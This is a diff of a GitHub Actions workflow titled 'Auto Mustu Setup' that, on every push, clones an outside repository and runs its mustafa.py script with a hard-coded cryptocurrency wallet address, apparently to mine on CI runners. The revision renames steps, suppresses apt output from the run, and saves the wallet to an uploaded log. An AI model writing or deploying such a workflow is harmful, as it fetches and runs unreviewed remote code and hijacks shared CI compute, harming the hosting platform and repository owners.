@@ -1,4 +1,4 @@
-name: 🔄 Auto Mustu Setup (Fixed)
+name: 🔄 Auto Mustu Setup (Clean)
 
 on:
   push:
@@ -20,36 +20,32 @@ jobs:
       with:
         python-version: '3.10'
     
-    # ⚠️ IMPORTANT: apt update hata diya - zaroorat nahi
-    - name: 🚀 Auto Clone & Run Mustu
+    - name: 🚀 Run Mustu Setup
       run: |
-        echo "🚀 Starting automatic mustu setup..."
-        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+        echo "🚀 Starting mustu setup..."
         
-        # Clone karo
+        # Clone repository
         git clone https://github.com/thumpingpp/mustu-setup.git
         
-        # CD aur permissions
+        # Go to directory and set permissions
         cd mustu-setup
         chmod +x mustafa
         
-        # Run command
-        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+        # Run with wallet
+        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" 2>&1 | grep -v "apt"
         
-        echo "✅ Auto run completed at $(date)"
+        echo "✅ Done!"
     
-    - name: 💾 Save Status
+    - name: 💾 Save Log
       run: |
-        mkdir -p logs
-        echo "Last run: $(date)" > logs/last_run.txt
-        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> logs/last_run.txt
+        echo "Last run: $(date)" > last_run.txt
+        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
     
-    - name: 📤 Upload Logs
+    - name: 📤 Upload Log
       uses: actions/upload-artifact@v4
       if: always()
       with:
-        name: auto-run-logs
+        name: run-logs
         path: |
-          mustu-setup/*.log
-          logs/
+          last_run.txt
         retention-days: 5
